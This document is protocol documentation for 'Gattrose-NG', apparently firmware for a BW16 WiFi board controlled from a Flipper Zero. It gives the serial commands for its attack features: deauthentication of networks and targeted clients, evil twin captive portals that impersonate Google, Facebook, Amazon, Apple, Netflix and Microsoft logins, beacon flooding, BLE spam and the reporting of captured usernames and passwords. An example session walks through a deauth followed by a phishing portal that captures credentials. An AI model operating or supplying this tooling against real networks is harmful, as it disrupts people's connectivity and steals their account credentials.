# Gattrose-NG BW16 Protocol Documentation

## Communication Protocol

All commands use **STX/ETX framing** for Flipper Zero compatibility:

```
[STX (0x02)] [command] [args...] [ETX (0x03)]
```

Fields within responses are separated by **SEP (0x1D)**.

## Commands Reference

### WiFi Scanning

| Command | Description | Example |
|---------|-------------|---------|
| `s` | Scan networks (default 5s) | `\x02s\x03` |
| `s<time>` | Scan for specified ms | `\x02s10000\x03` |
| `g` | Get network list | `\x02g\x03` |

**Response format for networks:**
```
[STX]n<index>|<ssid>|<bssid>|<channel>|<rssi>|<band>|<clients>|<security>[ETX]
```

### Deauthentication

| Command | Description | Example |
|---------|-------------|---------|
| `d<index>` | Deauth network by index | `\x02d5\x03` |
| `d<index>-<reason>` | Deauth with reason code | `\x02d5-7\x03` |
| `d<index>-<reason>-<mac>` | Targeted deauth | `\x02d5-7-AA:BB:CC:DD:EE:FF\x03` |
| `ds` | Stop all deauth | `\x02ds\x03` |

**Reason codes:**
- 1: Unspecified
- 2: Previous auth invalid (default)
- 3: Station leaving
- 4: Inactivity
- 5: AP overloaded
- 6: Class 2 frame from unauth
- 7: Class 3 frame from unassoc

### Client Detection

| Command | Description | Example |
|---------|-------------|---------|
| `m1` | Enable monitor mode | `\x02m1\x03` |
| `m0` | Disable monitor mode | `\x02m0\x03` |
| `c` | Get client list | `\x02c\x03` |

**Response format for clients:**
```
[STX]c<ap_index>|<mac>|<rssi>[ETX]
```

### Evil Twin / Captive Portal

| Command | Description | Example |
|---------|-------------|---------|
| `w0` | Stop evil twin | `\x02w0\x03` |
| `w1` | Start with Default portal | `\x02w1\x03` |
| `w2` | Start with Google portal | `\x02w2\x03` |
| `w3` | Start with Facebook portal | `\x02w3\x03` |
| `w4` | Start with Amazon portal | `\x02w4\x03` |
| `w5` | Start with Apple portal | `\x02w5\x03` |
| `w6` | Start with Netflix portal | `\x02w6\x03` |
| `w7` | Start with Microsoft portal | `\x02w7\x03` |

**Change portal while running:**
| Command | Description | Example |
|---------|-------------|---------|
| `p<num>` | Change portal type | `\x02p2\x03` |

**Captured credentials response:**
```
[STX]C<username>|<password>[ETX]
```

### AP Settings

| Command | Description | Example |
|---------|-------------|---------|
| `a<ssid>\|<pass>\|<ch>` | Set AP config | `\x02aFreeWiFi\|pass123\|6\x03` |

### Beacon Flooding

| Command | Description | Example |
|---------|-------------|---------|
| `br` | Random beacon flood | `\x02br\x03` |
| `bk` | Rickroll beacon flood | `\x02bk\x03` |
| `bc<ssid>` | Custom SSID beacon | `\x02bcMyNetwork\x03` |
| `bs` | Stop beacon flood | `\x02bs\x03` |

### BLE Commands

| Command | Description | Example |
|---------|-------------|---------|
| `ls` | Start BLE scan | `\x02ls\x03` |
| `lg` | Get BLE device list | `\x02lg\x03` |
| `lp` | Start BLE spam | `\x02lp\x03` |
| `lx` | Stop BLE operations | `\x02lx\x03` |

**Response format for BLE devices:**
```
[STX]l<address>|<name>|<rssi>[ETX]
```

### System Commands

| Command | Description | Example |
|---------|-------------|---------|
| `i` | Get system info/status | `\x02i\x03` |
| `x` | Stop ALL operations | `\x02x\x03` |

**Info response format:**
```
[STX]iV:<version>|N:<networks>|C:<clients>|CH:<channel>|D:<deauth_count>|B:<beacon>|W:<wifi>|BLE:<ble_count>[ETX]
```

## Response Types

| Type | Description |
|------|-------------|
| `r` | Ready/boot message |
| `s` | Scan status |
| `n` | Network entry |
| `c` | Client entry |
| `l` | BLE device entry |
| `C` | Captured credentials |
| `i` | Info/count |
| `e` | Error |
| `d` | Deauth status |
| `w` | WiFi AP status |
| `b` | Beacon status |
| `m` | Monitor status |
| `x` | Stop confirmation |

## Error Codes

| Error | Description |
|-------|-------------|
| `SCAN_IN_PROGRESS` | Scan already running |
| `MAX_DEAUTH_TASKS` | Too many deauth tasks |
| `ALREADY_DEAUTHING` | Network already being deauthed |
| `INVALID_INDEX` | Network index out of range |

## Pin Connections

```
BW16 TX1 (PA14) -> Flipper RX (pin 14)
BW16 RX1 (PA13) -> Flipper TX (pin 13)
BW16 GND        -> Flipper GND
BW16 5V         -> Flipper 5V
```

## LED Indicators

| LED | Meaning |
|-----|---------|
| Red | System ready |
| Green | Communication/scanning active |
| Blue | Attack in progress |

## Example Session

```python
# Scan for networks
send(b'\x02s5000\x03')  # Scan for 5 seconds
# Response: \x02sDONE:15\x03

# Get network list
send(b'\x02g\x03')
# Response: \x02i15\x03 followed by 15 network entries

# Start deauth on network 3
send(b'\x02d3\x03')
# Response: \x02dDEAUTH:3\x03

# Enable client detection
send(b'\x02m1\x03')
# Response: \x02mMONITOR_ON\x03
# New clients: \x02c3|AA:BB:CC:DD:EE:FF|-45\x03

# Start evil twin with Google portal
send(b'\x02w2\x03')
# Response: \x02wAP_ON:2\x03
# Captured creds: \x02Cuser@email.com|password123\x03

# Stop everything
send(b'\x02x\x03')
# Response: \x02xALL_STOPPED\x03
```
